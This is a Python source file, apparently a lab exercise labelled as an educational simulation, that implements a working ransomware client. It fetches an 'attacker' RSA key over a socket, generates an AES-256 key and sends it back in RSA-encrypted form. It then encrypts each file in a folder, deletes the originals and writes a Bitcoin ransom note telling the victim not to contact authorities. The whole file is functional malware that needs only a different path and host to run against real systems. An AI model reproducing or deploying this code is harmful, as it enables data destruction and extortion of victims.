import socket, os, base64, json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

class clienteVictima:
    def __init__(self, victim_id="victima", server_host='localhost', server_port=9999):
        self.victim_id = victim_id
        self.server_host = server_host
        self.server_port = server_port
        self.public_key_atacante = None
        self.clave_simetrica = None

    def conectar_atacante(self):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((self.server_host, self.server_port))
            public_key_pem = client_socket.recv(4096)
            self.public_key_atacante = serialization.load_pem_public_key(
                public_key_pem,
                backend=default_backend()
            )
            print("Victima: Clave publica del atacante recibida")
            return client_socket
        except Exception as e:
            print(f"Error conectando con atacante: {e}")
            return None

    def generar_clave_simetrica(self):
        self.clave_simetrica = os.urandom(32)
        print("Victima: Clave simetrica AES-256 generada")

    def cifrar_clave_simetrica(self):
        clave_cifrada = self.public_key_atacante.encrypt(
            self.clave_simetrica,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print("Clave simetrica cifrada con RSA")
        return clave_cifrada

    def cifrar_archivo(self, archivo_entrada, archivo_salida):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.clave_simetrica), modes.CBC(iv))
        encryptor = cipher.encryptor()
        with open(archivo_entrada, 'rb') as f_in:
            plaintext = f_in.read()
        pad_len = 16 - (len(plaintext) % 16)
        plaintext_padded = plaintext + bytes([pad_len] * pad_len)
        ciphertext = encryptor.update(plaintext_padded) + encryptor.finalize()
        with open(archivo_salida, 'wb') as f_out:
            f_out.write(iv + ciphertext)

    def generar_nota_rescate(self):
        """Genera la nota de rescate en el directorio sample_recovered"""
        os.makedirs("lab/sample_recovered", exist_ok=True)
        
        nota_rescate = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                              ⚠️  ADVERTENCIA  ⚠️                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  🚨 SUS ARCHIVOS HAN SIDO CIFRADOS 🚨                                       ║
║                                                                              ║
║  Todos sus archivos importantes han sido cifrados usando un algoritmo       ║
║  de cifrado militar de grado AES-256.                                       ║
║                                                                              ║
║  📁 Archivos afectados:                                                      ║
║                                                                               ║
║     • Todos los archivos en lab/sample_plain/                                ║
║                                                                              ║
║  🔐 ¿Qué significa esto?                                                     ║
║     Sus archivos están seguros, pero inaccesibles sin la clave de           ║
║     descifrado. Solo nosotros podemos restaurarlos.                         ║
║                                                                              ║
║  💰 ¿Cómo recuperar sus archivos?                                            ║
║     1. Pague el rescate de $500 USD en Bitcoin                              ║
║     2. Envíe el comprobante a: ransomware@darkweb.com                       ║
║     3. Recibirá la clave de descifrado en 24 horas                          ║
║                                                                              ║
║  ⏰ TIEMPO LIMITE: 48 horas                                                  ║
║     Después de este tiempo, la clave será destruida permanentemente.        ║
║                                                                              ║
║  🚫 NO INTENTE:                                                              ║
║     • Descifrar los archivos usted mismo                                     ║
║     • Usar software de recuperación                                          ║
║     • Contactar a las autoridades                                            ║
║                                                                              ║
║  📧 Contacto: ransomware@darkweb.com                                        ║
║  🆔 ID de Víctima: {self.victim_id}                                          ║
║                                                                              ║
║  Esta es una simulación educativa. No se ha realizado ningún daño real.     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

"""
        
        with open("lab/sample_recovered/ransom_note.txt", "w", encoding="utf-8") as f:
            f.write(nota_rescate)
        
        print("Nota de rescate creada en lab/sample_recovered/ransom_note.txt")

    def ejecutar_ataque(self):
        client_socket = self.conectar_atacante()
        if not client_socket:
            return
        self.generar_clave_simetrica()
        clave_cifrada = self.cifrar_clave_simetrica()

        data = {
            'victim_id': self.victim_id,
            'clave_cifrada': base64.b64encode(clave_cifrada).decode('utf-8')
        }
        client_socket.send(json.dumps(data).encode())
        print(client_socket.recv(1024).decode())

        os.makedirs("lab/sample_cipher", exist_ok=True)
        for archivo in os.listdir("lab/sample_plain"):
            entrada = f"lab/sample_plain/{archivo}"
            salida = f"lab/sample_cipher/{archivo}.enc"
            self.cifrar_archivo(entrada, salida)
            os.remove(entrada)
            print(f"{archivo} cifrado y original eliminado")

        # Generar nota de rescate
        self.generar_nota_rescate()
        
        client_socket.close()
        print("Nota de rescate generada.")
        print("Ataque completado.")

if __name__ == "__main__":
    victima = clienteVictima()
    victima.ejecutar_ataque()
